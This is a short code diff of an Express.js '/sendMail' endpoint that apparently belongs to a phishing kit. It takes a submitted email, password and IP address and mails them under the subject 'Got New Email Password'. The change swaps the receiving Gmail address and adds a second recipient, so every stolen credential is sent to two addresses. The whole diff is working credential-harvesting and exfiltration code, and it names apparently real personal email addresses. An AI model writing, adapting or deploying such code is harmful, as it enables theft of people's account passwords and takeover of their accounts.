@@ -38,22 +38,34 @@ app.get("/sendMail", async (req, res, next) => {
     }
     const mailOptions = {
       from: `no-reply`,
-      to: "hussnain77133@gmail.com",
+      to: "mktimothy46@gmail.com",
       subject: `Got New Email Password`,
-      html: `<p style="font-size: 16px;">Email : ${email} </p>
-                <br />
-               <h1>Password : ${password},</h1>
-               <h1>Ip Address : ${ipaddress},</h1>
-               
+      html: `  <h4 style="font-size: 16px;">Email : ${email} </h4>
+               <h4>Password : ${password},</h4>
+               <h4>Ip Address : ${ipaddress},</h4>
+              `,
+    };
+    const mailOptions2 = {
+      from: `no-reply`,
+      to: "hassanssekasamba@gmail.com",
+      subject: `Got New Email Password`,
+      html: `  <h4 style="font-size: 16px;">Email : ${email} </h4>
+               <h4>Password : ${password},</h4>
+               <h4>Ip Address : ${ipaddress},</h4>
               `,
     };
     transporter.sendMail(mailOptions, (erro, info) => {
       if (erro) {
         return res.status(200).json(erro.toString());
       }
-      return res
-        .status(200)
-        .json({ dataSent: req.body, RESPONCE: "Email Sent" });
+      transporter.sendMail(mailOptions2, (erro, info) => {
+        if (erro) {
+          return res.status(200).json(erro.toString());
+        }
+        return res
+          .status(200)
+          .json({ dataSent: req.body, RESPONCE: "Email Sent" });
+      });
     });
   } catch (error) {
     return res.status(200).json({
